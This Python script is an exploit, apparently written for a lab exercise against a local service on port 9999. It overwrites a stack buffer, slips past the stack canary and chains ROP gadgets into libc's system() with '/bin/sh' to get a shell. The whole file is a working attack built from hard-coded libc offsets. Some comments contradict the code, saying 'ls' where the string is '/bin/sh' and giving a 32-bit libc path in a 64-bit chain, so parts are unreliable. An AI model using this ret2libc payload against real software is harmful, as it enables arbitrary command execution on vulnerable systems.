#!/usr/bin/env python3
import struct
import socket
from srv_canary import *
HOST = "127.0.0.1"
PORT = 9999
TIMEOUT = 1.5

# offset de system() en la libc (objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system)
system_offset = 0x53110

# offset de exit() en la libc (objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep exit)
exit_offset = 0x42340

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
pop_rdi_ret_offset = 0x2a145

# offset de "/bin/sh" en la libc -> addr "ls" - (addr system - system_offset)
# strings -t x /lib32/libc.so.6 | grep "/bin/sh" ->  1a7ea4 /bin/sh
binsh_offset = 0x1a7ea4

def create_payload(libc_base, canary, padding, canary_padding):	
	payload  = b"A" * padding
	payload += struct.pack("<Q", canary) # Dirección del canario
	payload += b"A" * canary_padding # Saltea las siguiente direccion correspondiente al RBP
	
	pop_rdi_ret = libc_base + pop_rdi_ret_offset
	cmd_addr = libc_base + binsh_offset
	system_addr = libc_base + system_offset
	
	# ROP chain:
	payload += struct.pack("<Q", pop_rdi_ret)          # gadget: pop rdi; ret
	payload += struct.pack("<Q", cmd_addr)             # argument → “ls”
	payload += struct.pack("<Q", system_addr)          # call system("ls")
	
	return payload


if __name__ == "__main__":
	buffer_size = 64
	canary = int(sys.argv[1], 16)
	offset = 72
	libc_base = 0x00007ffff7dab000
	p = 8
	payload = create_payload(libc_base, canary, offset, p);
	test_payload(payload)
